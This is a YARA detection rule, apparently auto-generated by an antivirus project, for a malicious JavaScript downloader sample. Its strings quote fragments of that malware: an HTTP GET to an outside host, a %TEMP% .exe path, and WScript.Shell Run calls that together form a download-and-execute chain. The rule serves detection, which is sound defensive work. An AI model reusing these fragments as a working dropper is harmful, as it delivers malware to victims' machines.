rule sig_20160329_fe4b1e5543b4e438f59312e82248634c {
  meta:
    description = "datamaliciousorder - file 20160329_fe4b1e5543b4e438f59312e82248634c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "38ab68ad08f5508a31b70a8c52003dbac543d8a8a00eeabdc66737f0b1bb8993"

  strings:
    $s1  = "PB[wZ](\"GET\", \"http://www.deco-dessert.com/k3dua\", false);" fullword ascii
    $s2  = "function QZ() {return w0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8Tf1hJQCdfy.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[r](AA() * 11); if (PB[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Za(P1, G){P = P * 1; return P1 - G;};" fullword ascii
    $s5  = "var w0 = function R() {return WScript[oC](\"WScript.Shell\");}(), z = 11;" fullword ascii
    $s6  = "function dq(){return \"\" + U;};" fullword ascii
    $s7  = "function e(yA){w0[\"Run\"](yA, P, P);};" fullword ascii
    $s8  = "function y() {return ((Tz == true) && (Tz == I)) ? 1 : P;};" fullword ascii
    $s9  = " while (l){" fullword ascii
    $s10 = "function x()" fullword ascii
    $s11 = "function Ua(){return oC;};" fullword ascii
    $s12 = "return Za(rv, P0);" fullword ascii
    $s13 = "var Sc = new this[\"Date\"]();" fullword ascii
    $s14 = "function W(Ru) {var Ns = (1, 2, 3, 4, 5, Ru); return Ns;};" fullword ascii
    $s15 = "function AA(){return 22;};" fullword ascii
    $s16 = "var I = false;" fullword ascii
    $s17 = "I = true; " fullword ascii
    $s18 = "var Jm = false;" fullword ascii
    $s19 = "Tz = true; " fullword ascii
    $s20 = "var Tz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}